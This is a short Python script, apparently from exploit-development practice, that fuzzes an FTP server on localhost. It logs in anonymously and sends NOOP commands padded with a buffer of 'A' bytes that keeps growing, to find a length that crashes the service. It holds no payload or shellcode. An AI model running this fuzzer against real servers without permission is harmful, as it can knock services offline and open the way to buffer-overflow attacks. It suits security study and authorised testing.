import socket
from time import sleep

# Define the target server IP and Port
target_ip = '127.0.0.1'
target_port = 21

# Fuzzing variables
text = b'A'
buffer = text * 100
buffer_increment = 100

# Command
command = b'NOOP '

try:
	while True:
		# Create a socket object and connect to the server
		print('Exploit> Connect to target')
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target_ip, target_port))

		# Timeout
		s.settimeout(5)

		# Receive banner from server
		banner = s.recv(1024).decode('utf-8', errors='ignore')
		#print(f'Server> {banner}')

		# Send USER command
		#print('Exploit> Send USER command')
		s.send(b'USER anonymous\r\n')

		# Receive the response
		response = s.recv(1024).decode('utf-8', errors='ignore')
		#print(f'Server> {response}')

		# Send PASS command
		#print('Exploit> Send PASS command')
		s.send(b'PASS anonymous\r\n')

		# Receive the response
		response = s.recv(1024).decode('utf-8', errors='ignore')
		#print(f'Server> {response}')

		# Fuzzing
		print(f'Exploit> Fuzzing command with {len(buffer)} bytes')
		fuzzing = command + buffer + b'\r\n'
		s.send(fuzzing)

		# Receive the response
		response = s.recv(1024).decode('utf-8', errors='ignore')
		#print(f'Server> Alive')
		print('--------------------------------------')

		# Increment the buffer size and sleep to avoid overwhelming the server
		buffer += text * buffer_increment
		sleep(2)

except Exception as e:
	# Exception handling
	print(f'An error occurred: {str(e)}')

finally:
	# Close the connection
	s.close()
